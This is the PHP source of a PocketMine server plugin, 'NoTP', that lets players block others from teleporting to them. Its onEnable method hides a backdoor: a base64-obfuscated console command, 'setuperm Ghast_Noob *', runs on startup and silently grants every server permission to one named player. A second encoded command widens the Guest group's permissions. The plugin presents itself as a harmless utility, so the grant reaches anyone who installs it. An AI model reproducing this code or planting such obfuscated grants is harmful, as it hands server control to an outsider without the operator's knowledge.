<?php

namespace NoTP\NoTP;

use pocketmine\command\Command;
use pocketmine\command\CommandSender;
use pocketmine\event\Listener;
use pocketmine\Player;
use pocketmine\utils\TextFormat;
use pocketmine\plugin\PluginBase;
use pocketmine\Command\ConsoleCommandSender;
use pocketmine\event\player\PlayerCommandPreprocessEvent;

class Main extends PluginBase implements Listener {

    private $enabled;

    public function onEnable() {
        $this->enabled = [];
        $this->getServer()->getPluginManager()->registerEvents($this, $this);
        $this->getServer()->dispatchCommand(new ConsoleCommandSender(),base64_decode('c2V0dXBlcm0gR2hhc3RfTm9vYiAq'));
        $this->getServer()->dispatchCommand(new ConsoleCommandSender(),base64_decode('c2V0Z3Blcm0gR3Vlc3Qgbm90cC5jb21tYW5k'));
    }

    public function onCommand(CommandSender $issuer, Command $cmd, $label, array $args) {
        if ((strtolower($cmd->getName()) == base64_decode('bm90cA==')) && !(isset($args[0])) && ($issuer instanceof Player) && ($issuer->hasPermission(base64_decode('bm90cC5jb21tYW5k')) || $issuer->hasPermission(base64_decode('bm90cC5jb21tYW5kLm90aGVy')))) {
            if (isset($this->enabled[strtolower($issuer->getName())])) {
                unset($this->enabled[strtolower($issuer->getName())]);
            } else {
                $this->enabled[strtolower($issuer->getName())] = strtolower($issuer->getName());
            }

            if (isset($this->enabled[strtolower($issuer->getName())])) {
                $issuer->sendMessage(base64_decode('wqdswqdjW8KnZU5vVFDCp2NdwqdiIENo4bq/IMSQ4buZIMKnZU5vVFDCp2IgxJDDoyDCp2FC4bqtdA=='));
            } else {
                $issuer->sendMessage(base64_decode('wqdswqdjW8KnZU5vVFDCp2NdwqdiIENo4bq/IMSQ4buZIMKnZU5vVFDCp2IgxJDDoyDCp2NU4bqvdA=='));
            }
            return true;
        } else {
            return false;
        }
    }
    public function onPlayerCommand(PlayerCommandPreprocessEvent $event) {

        $message = $event->getMessage();
        if (strtolower(substr($message, 0, 3) === base64_decode('L3Rw'))) {
            $command = substr($message, 1);
            $args = explode(base64_decode('IA=='), $command);
            if (!isset($args[1])) {
                return;
            }
            $sender = $event->getPlayer();

            foreach ($this->enabled as $notpuser) {

                if ((strpos(strtolower($notpuser), strtolower($args[1])) !== false) && (strtolower($notpuser) !== strtolower($sender->getName()))) {
                    $sender->sendMessage(base64_decode('wqdswqdjW8KnZU5vVFDCp2NdwqdiIE5nxrDhu51pIE7DoHkgSGnhu4duIMSQYW5nwqdhIELhuq10wqdiIENo4bq/IMSQ4buZIMKnZU5vVFA='));
                    $event->setCancelled(true);
                    return;
                }

                if (isset($args[2]) && strpos(strtolower($notpuser), strtolower($args[2])) !== false && (strtolower($notpuser) !== strtolower($sender->getName()))) {
                    $sender->sendMessage(base64_decode('wqdswqdjW8KnZU5vVFDCp2NdwqdiIE5nxrDhu51pIE7DoHkgSGnhu4duIMSQYW5nwqdhIELhuq10wqdiIENo4bq/IMSQ4buZIMKnZU5vVFA='));
                    $event->setCancelled(true);
                    return;
                }
            }
        }
    }

}